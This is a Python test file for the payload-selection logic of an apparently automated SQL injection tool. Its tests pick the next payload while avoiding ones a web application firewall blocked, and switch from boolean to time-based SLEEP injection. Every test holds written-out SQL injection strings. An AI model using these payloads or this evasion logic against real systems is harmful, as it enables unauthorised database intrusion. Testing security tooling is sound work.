from core.loop_controller import select_best_candidate


def test_candidate_in_history_should_not_be_selected_when_clean_candidate_exists():
    candidates = [
        "1' AND 2=2 -- -",
        "1' AND 3=3 -- -",
    ]

    history = [
        {
            "payload": "1' AND 2=2 -- -",
            "normalized_payload": "1' AND 2=2 -- -",
            "likely_result": "waf_blocked",
        },
    ]

    context = {
        "current_payload": "1' AND 1=1 -- -",
        "preferred_style": "quoted",
    }

    selected, reason = select_best_candidate(
        candidates=candidates,
        history=history,
        context=context,
    )

    assert selected == "1' AND 3=3 -- -"


def test_empty_ranked_candidates_falls_back_to_current_payload():
    candidates = []

    history = []

    context = {
        "current_payload": "1' AND 1=1 -- -",
    }

    selected, reason = select_best_candidate(
        candidates=candidates,
        history=history,
        context=context,
    )

    assert selected == "1' AND 1=1 -- -"
    assert reason == "fallback to current payload because no valid candidates were available"


def test_consecutive_boolean_failures_with_prior_history_switches_strategy():
    candidates = [
        "1' AND 5=5 -- -",
        "1' AND SLEEP(2) -- -",
    ]

    history = [
        {
            "payload": "1' UNION SELECT 1,2 -- -",
            "likely_result": "waf_blocked",
        },
        {
            "payload": "1' AND 1=2 -- -",
            "likely_result": "no_boolean_difference",
        },
        {
            "payload": "1' AND 2=3 -- -",
            "likely_result": "no_boolean_difference",
        },
    ]

    context = {
        "current_payload": "1' AND 2=3 -- -",
        "preferred_style": "quoted",
    }

    selected, reason = select_best_candidate(
        candidates=candidates,
        history=history,
        context=context,
    )

    assert selected == "1' AND SLEEP(2) -- -"


def test_normalized_payload_takes_priority_over_payload_key():
    candidates = [
        "1' AND 2=2 -- -",
        "1' AND 3=3 -- -",
    ]

    history = [
        {
            "payload": "1' AND 3=3 -- -",
            "normalized_payload": "1' AND 2=2 -- -",
            "likely_result": "waf_blocked",
        },
    ]

    context = {
        "current_payload": "1' AND 1=1 -- -",
        "preferred_style": "quoted",
    }

    selected, reason = select_best_candidate(
        candidates=candidates,
        history=history,
        context=context,
    )

    assert selected == "1' AND 3=3 -- -"
